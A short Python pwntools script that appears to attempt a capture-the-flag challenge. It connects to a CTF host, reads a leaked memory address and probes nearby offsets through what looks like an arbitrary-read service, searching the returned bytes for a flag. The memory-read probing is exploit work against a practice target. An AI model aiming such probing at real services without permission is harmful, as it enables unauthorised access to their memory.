from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'
io = remote(HOST, PORT, ssl=True)

# Get the base address
intro = io.recvline_contains(b'flag is over at').decode()
banner2 = io.recvline().decode()
print(intro.strip())
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
base = int(m.group(1), 16)
print(f'Dict base: {hex(base)}')

def test_read(addr):
    # Send the exact format - just the hex number without 0x prefix
    addr_str = f"{addr:x}"  # hex without 0x prefix
    print(f"Trying to read from: {addr_str}")
    io.sendline(addr_str.encode())
    line = io.recvline(timeout=3).decode().strip()
    print(f"Response: {line}")
    return line

print("\n=== Testing direct address reads ===")

# Test the exact base address with different formats
test_addresses = [
    base,           # Exact address
    base + 8,       # +8 bytes  
    base + 16,      # +16 bytes
    base + 24,      # +24 bytes
    base - 8,       # -8 bytes
]

for addr in test_addresses:
    print(f"\n--- Testing {addr:#x} ---")
    response = test_read(addr)
    
    if 'illegal memory address' not in response and ':' in response:
        print("SUCCESS! Found readable memory")
        try:
            _, hex_data = response.split(': ')
            raw_bytes = bytes.fromhex(hex_data.strip())
            chars = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in raw_bytes)
            print(f"Data: {hex_data}")
            print(f"ASCII: {chars}")
            
            # Look for flag patterns
            if any(c in chars for c in 'KCSC{}'):
                print("*** POTENTIAL FLAG DATA FOUND ***")
        except Exception as e:
            print(f"Parse error: {e}")

io.close()